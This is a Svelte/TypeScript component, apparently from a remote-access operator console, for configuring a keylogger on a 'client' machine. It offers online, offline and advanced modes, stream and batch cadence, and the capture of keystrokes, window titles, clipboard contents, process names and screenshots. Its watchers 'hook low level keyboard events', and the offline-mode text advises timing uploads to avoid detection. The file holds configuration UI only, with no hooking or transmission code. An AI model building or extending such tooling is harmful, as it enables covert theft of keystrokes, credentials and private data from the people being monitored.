<script lang="ts">
	import { Button } from '$lib/components/ui/button/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardFooter,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import { getClientTool } from '$lib/data/client-tools';
	import type { Client } from '$lib/data/clients';
	import { appendWorkspaceLog, createWorkspaceLogEntry } from '$lib/workspace/utils';
	import type { WorkspaceLogEntry } from '$lib/workspace/types';

	type KeyloggerMode = 'online' | 'offline' | 'advanced-online';

	const toolMap = {
		online: 'keylogger-online',
		offline: 'keylogger-offline',
		'advanced-online': 'keylogger-advanced-online'
	} as const;

	const modeCopy: Record<
		KeyloggerMode,
		{ subtitle: string; cadenceLabel: string; bufferLabel: string }
	> = {
		online: {
			subtitle: 'Stream keystrokes live into the operator console.',
			cadenceLabel: 'Stream cadence (ms)',
			bufferLabel: 'In-memory buffer (events)'
		},
		offline: {
			subtitle: 'Persist keystrokes locally and upload on a schedule.',
			cadenceLabel: 'Batch interval (minutes)',
			bufferLabel: 'Disk retention limit (events)'
		},
		'advanced-online': {
			subtitle: 'Capture keystrokes with active window and application metadata.',
			cadenceLabel: 'Stream cadence (ms)',
			bufferLabel: 'Context window (events)'
		}
	};

	const props = $props<{ client: Client; mode: KeyloggerMode }>();
	const client = props.client;
	void client;
	const mode = props.mode;

	const tool = getClientTool(toolMap[mode as keyof typeof toolMap]);
	void tool;

	let cadence = $state(mode === 'offline' ? 15 : 250);
	let bufferSize = $state(mode === 'offline' ? 5000 : 300);
	let includeWindowTitles = $state(mode !== 'offline');
	let includeClipboard = $state(mode === 'advanced-online');
	let encryptAtRest = $state(mode !== 'online');
	let redactSecrets = $state(true);
	let emitProcessNames = $state(mode === 'advanced-online');
	let includeScreenshots = $state(false);
	let log = $state<WorkspaceLogEntry[]>([]);

	function describePlan(): string {
		const segments = [
			`${mode} mode`,
			`${mode === 'offline' ? cadence : `${cadence}ms`} cadence`,
			`${bufferSize} events`,
			includeWindowTitles ? 'window titles' : 'window IDs only',
			encryptAtRest ? 'encrypted' : 'plain text',
			redactSecrets ? 'redaction on' : 'redaction off'
		];
		if (includeClipboard) segments.push('clipboard mirrored');
		if (emitProcessNames) segments.push('process tags');
		if (includeScreenshots) segments.push('screen snippets');
		return segments.join(' · ');
	}

	function append(status: WorkspaceLogEntry['status']) {
		log = appendWorkspaceLog(
			log,
			createWorkspaceLogEntry('Keylogger configuration staged', describePlan(), status)
		);
	}

	const copy = modeCopy[mode as KeyloggerMode];

	const metadata = $derived(() => [
		{
			label: 'Mode',
			value: mode,
			hint: copy.subtitle
		},
		{
			label: 'Encryption',
			value: encryptAtRest ? 'Enabled' : 'Disabled'
		}
	]);
	void metadata;

	const watchers = [
		{ id: 'foreground', description: 'Track active window focus changes' },
		{ id: 'keyboard', description: 'Hook low level keyboard events' },
		{ id: 'clipboard', description: 'Mirror clipboard text mutations' }
	] as const;
</script>

<div class="space-y-6">
	<Card>
		<CardHeader>
			<CardTitle class="text-base">Collection settings</CardTitle>
			<CardDescription
				>Adjust cadence, buffers, and telemetry captured alongside keystrokes.</CardDescription
			>
		</CardHeader>
		<CardContent class="space-y-6">
			<div class="grid gap-4 md:grid-cols-2">
				<div class="grid gap-2">
					<Label for={`keylogger-cadence-${mode}`}>{copy.cadenceLabel}</Label>
					<Input
						id={`keylogger-cadence-${mode}`}
						type="number"
						min={mode === 'offline' ? 5 : 25}
						step={mode === 'offline' ? 5 : 25}
						bind:value={cadence}
					/>
				</div>
				<div class="grid gap-2">
					<Label for={`keylogger-buffer-${mode}`}>{copy.bufferLabel}</Label>
					<Input
						id={`keylogger-buffer-${mode}`}
						type="number"
						min={50}
						step={50}
						bind:value={bufferSize}
					/>
				</div>
			</div>

			<div class="grid gap-4 md:grid-cols-2">
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Capture window context</p>
						<p class="text-xs text-muted-foreground">Adds active window title metadata</p>
					</div>
					<Switch bind:checked={includeWindowTitles} />
				</label>
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Encrypt at rest</p>
						<p class="text-xs text-muted-foreground">Store batches with AES-GCM before upload</p>
					</div>
					<Switch bind:checked={encryptAtRest} />
				</label>
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Secret redaction</p>
						<p class="text-xs text-muted-foreground">Mask credentials and card-like patterns</p>
					</div>
					<Switch bind:checked={redactSecrets} />
				</label>
				{#if mode !== 'offline'}
					<label
						class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
					>
						<div>
							<p class="text-sm font-medium text-foreground">Screenshot hints</p>
							<p class="text-xs text-muted-foreground">Capture mini frames around spikes</p>
						</div>
						<Switch bind:checked={includeScreenshots} />
					</label>
				{/if}
				{#if mode === 'advanced-online'}
					<label
						class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
					>
						<div>
							<p class="text-sm font-medium text-foreground">Tag processes</p>
							<p class="text-xs text-muted-foreground">Include owning process + hash</p>
						</div>
						<Switch bind:checked={emitProcessNames} />
					</label>
				{/if}
				{#if mode === 'advanced-online'}
					<label
						class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
					>
						<div>
							<p class="text-sm font-medium text-foreground">Clipboard mirroring</p>
							<p class="text-xs text-muted-foreground">Sync clipboard alongside keystrokes</p>
						</div>
						<Switch bind:checked={includeClipboard} />
					</label>
				{/if}
			</div>
		</CardContent>
		<CardFooter class="flex flex-wrap gap-3">
			<Button type="button" variant="outline" onclick={() => append('draft')}>Save draft</Button>
			<Button type="button" onclick={() => append('queued')}>Queue collection</Button>
		</CardFooter>
	</Card>

	<Card class="border-dashed">
		<CardHeader>
			<CardTitle class="text-base">Signal watchers</CardTitle>
			<CardDescription
				>Modules that will emit telemetry once the keylogger activates.</CardDescription
			>
		</CardHeader>
		<CardContent class="space-y-2 text-sm text-muted-foreground">
			<ul class="list-disc space-y-1 pl-5">
				{#each watchers as watcher (watcher.id)}
					<li>{watcher.description}</li>
				{/each}
			</ul>
			{#if mode === 'offline'}
				<p class="text-xs text-muted-foreground">
					Offline mode batches events on disk. Schedule upload windows around low-activity periods
					to avoid detection.
				</p>
			{/if}
		</CardContent>
	</Card>
</div>
